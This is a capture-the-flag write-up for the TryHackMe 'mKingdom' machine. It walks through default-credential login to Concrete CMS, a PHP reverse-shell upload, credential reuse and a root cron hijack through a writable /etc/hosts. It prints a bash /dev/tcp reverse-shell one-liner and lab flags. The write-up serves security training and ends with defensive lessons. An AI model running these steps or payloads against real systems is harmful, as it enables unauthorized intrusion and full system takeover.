# mKingdom — TryHackMe Writeup
> **Platform:** TryHackMe | **Category:** Web (Concrete CMS), File Upload RCE, Cron Job Hijacking, Privilege Escalation

---

## Overview

This machine runs a Concrete CMS-based blog on a non-standard HTTP port. Default credentials grant access to the admin panel, where the file upload restrictions can be loosened to allow PHP execution — leading to an initial foothold as `www-data`. From there, hardcoded database credentials and a Base64-encoded environment variable provide lateral movement through two more user accounts. Privilege escalation to root is achieved by abusing a world-writable `/etc/hosts` file combined with a root-owned cron job that blindly `curl`s a domain resolved from that file, allowing a malicious script to be served and executed as root.

**Attack Chain:**
```
Nmap → Directory fuzzing → Concrete CMS discovery → Default creds
→ File upload restriction bypass → PHP reverse shell → www-data
→ database.php creds → su toad → Base64 env var → su mario
→ pspy (process monitor) → root cron job via /etc/hosts hijack
→ Malicious counter.sh served → root
```

---

## Step 1 — Reconnaissance

```bash
sudo nmap -sV -O 10.65.149.61
```

```
PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 (Ubuntu)
No exact OS matches for host
Network Distance: 3 hops
```

A single service is exposed, running on the non-default port **85**.

---

## Step 2 — Web Enumeration

The root page displays a taunting message:

```
Bwa, ha, ha, pathetic, you'll never learn!
```

Fuzzing the root directory:

```bash
gobuster dir -u http://10.65.149.61:85/ -w common.txt
```

```
app          (Status: 301) [--> http://10.65.149.61:85/app/]
index.html   (Status: 200) [Size: 647]
```

The `/app/` path leads to:

```
http://10.65.149.61:85/app/castle/index.php
```

A blog running on **PHP, Apache, Ubuntu, and Concrete CMS**.

Fuzzing further inside `/app/castle/`:

```bash
gobuster dir -u http://10.65.149.61:85/app/castle/ -w common.txt
```

```
application  (Status: 301) [--> .../app/castle/application/]
concrete     (Status: 301) [--> .../app/castle/concrete/]
packages     (Status: 301) [--> .../app/castle/packages/]
robots.txt   (Status: 200) [Size: 532]
updates      (Status: 301) [--> .../app/castle/updates/]
```

Checking each directory:
- `/application/` → blank page (interesting — later becomes relevant).
- `/concrete/` → the full PHP file structure of the CMS, but every file returns "access denied" except JavaScript files.
- `/packages/` and `/updates/` → empty Apache directory listings.
- `robots.txt` → maps out disallowed paths, confirming the Concrete CMS application structure (`/application/controllers`, `/application/config`, etc.).

---

## Step 3 — Admin Access via Default Credentials

Inside `/concrete/`, a `login.php` file is found. Logging in with the default credentials:

```
Username: admin
Password: password
```

grants access to the admin panel.

---

## Step 4 — File Upload Restriction Bypass → RCE

Browsing the admin panel reveals a file upload feature, along with a setting controlling which file extensions are allowed to be uploaded. The allowed extensions list is modified to permit `.php` and `.py` files.

A PHP reverse shell (the classic `pentestmonkey`-style payload) is prepared, pointing back to the attacker's IP on port 443, and uploaded through the now-unrestricted upload form.

Setting up the listener:

```bash
sudo nc -lvnp 443
```

Triggering the uploaded shell by browsing to its location returns a connection:

```
Listening on 0.0.0.0 443
Connection received on 10.65.149.61 40526
Linux mkingdom.thm 4.4.0-148-generic ... x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
$ whoami
www-data
```

---

## Step 5 — Credential Harvesting → `su toad`

Since no SSH port is open, further access has to come from credentials found on the box. A configuration file discloses database credentials:

```bash
$ cat database.php
```

```php
return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            ...
        ],
    ],
];
```

The `toad` / `toadisthebest` pair is reused directly as a system account:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@mkingdom:/$ su toad
Password: toadisthebest
toad@mkingdom:~$
```

No flag is found in `toad`'s home directory — just an ASCII art file (`smb.txt`). Time to pivot further.

---

## Step 6 — Environment Variable Leak → `su mario`

Checking the environment as `toad`:

```bash
toad@mkingdom:~/Public$ env
```

```
PWD_token=aWthVGVOVEFOdEVTCg==
...
```

A suspicious Base64 string sitting in a custom environment variable. Decoding it:

```bash
echo "aWthVGVOVEFOdEVTCg==" | base64 -d
```

```
ikaTeNTANtES
```

This turns out to be the password for the `mario` account:

```bash
toad@mkingdom:/home/toad/Public$ whoami
mario
```

The user flag exists in `mario`'s home directory but isn't directly readable:

```bash
$ cat user.txt
cat: user.txt: Permission denied
```

Copying it to `/tmp` (world-readable) resolves this:

```bash
mario@mkingdom:~$ cp user.txt /tmp
mario@mkingdom:~$ cd /tmp
mario@mkingdom:/tmp$ cat user.txt
thm{030a769febb1b3291da1375234b84283}
```

**User flag captured.**

---

## Step 7 — Privilege Escalation Recon with LinPEAS

To find a path to root, `linpeas.sh` is served from the attacking machine and pulled onto the target:

```bash
# Attacker
python3 -m http.server 9999
```

```bash
# Target
wget http://192.168.138.111:9999/linpeas.sh
chmod +x linpeas.sh
sh linpeas.sh
```

Key finding: **`/etc/hosts` is world-writable.**

```bash
mario@mkingdom:/tmp$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       mkingdom.thm
127.0.0.1       backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org
```

LinPEAS doesn't surface anything else actionable, so process monitoring is the next step. Using **pspy** (a tool for observing running processes without root privileges) reveals a recurring root-owned cron job:

```
CMD: UID=0  PID=20470  | curl mkingdom.thm:85/app/castle/application/counter.sh
CMD: UID=0  PID=20469  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter
```

Fetching that script in a browser shows its contents:

```bash
#!/bin/bash
echo "There are $(ls -laR /var/www/html/app/castle/ | wc -l) folder and files in TheCastleApp in - - - - > $(date)."
```

A root cron job is periodically curling `counter.sh` from `mkingdom.thm` — a hostname resolved locally via the writable `/etc/hosts` file.

---

## Step 8 — Hijacking DNS Resolution to Serve a Malicious Script

Since `/etc/hosts` is writable, `mkingdom.thm` is repointed from `127.0.0.1` to the attacker's own IP address.

The exact directory path expected by the cron job is recreated locally:

```bash
[davidoberst@archlinux ~]$ mkdir -p app/castle/application
[davidoberst@archlinux ~]$ cd app/castle/application
```

A malicious `counter.sh` is placed there, containing a reverse shell payload instead of the original counting logic:

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/192.168.138.111/4444 0>&1' > counter.sh
```

A web server is started on port 85 (matching the port the cron job requests) to serve it:

```bash
sudo python3 -m http.server 85
```

A listener is set up to catch the resulting shell:

```bash
nc -lvnp 4444
```

After the next cron execution, the root-owned process fetches and runs the malicious script:

```
Connection received on ...
bash: cannot set terminal process group (21382): Inappropriate ioctl for device
bash: no job control in this shell
root@mkingdom:~# whoami
root
```

---

## Step 9 — Root Flag

```bash
root@mkingdom:~# cat root.txt
cat: root.txt: Permission denied
```

As before, the file lacks read permissions for direct access but can be copied to a world-readable location:

```bash
root@mkingdom:~# cp root.txt /tmp
root@mkingdom:~# cd /tmp
root@mkingdom:/tmp# cat root.txt
thm{e8b2f52d88b9930503cc16ef48775df0}
```

**Root flag captured.**

---

## Summary of Findings

| Step | Vulnerability | Impact |
|------|---------------|--------|
| Initial Access | Default admin credentials on Concrete CMS + unrestricted file upload extensions | RCE and shell as `www-data` |
| Credential Reuse | Database credentials in `database.php` reused as a system account | Access as `toad` |
| Information Disclosure | Base64-encoded password stored in a custom environment variable | Access as `mario` |
| Privilege Escalation | World-writable `/etc/hosts` + root cron job blindly curling a hostname it resolves | Full root access |

---

## Key Takeaways

- **Never leave default admin credentials in place** — `admin:password` was enough to compromise the entire application.
- **Upload restrictions must be enforced server-side and treated as security controls**, not configurable UI toggles — allowing `.php` uploads from the admin panel directly enabled RCE.
- **Reused credentials are a lateral movement goldmine** — database credentials in a config file turned out to be valid system login credentials.
- **Environment variables can leak secrets** — a Base64-encoded password left in `env` output should never be assumed "hidden."
- **`/etc/hosts` write access combined with any process resolving a hostname it defines is a critical local privilege escalation vector** — especially when that process runs as root via cron and fetches remote content over an unauthenticated protocol like plain HTTP.
- **Process monitoring tools like `pspy` are invaluable** for spotting cron jobs and scheduled tasks that static enumeration scripts (like LinPEAS) can miss.


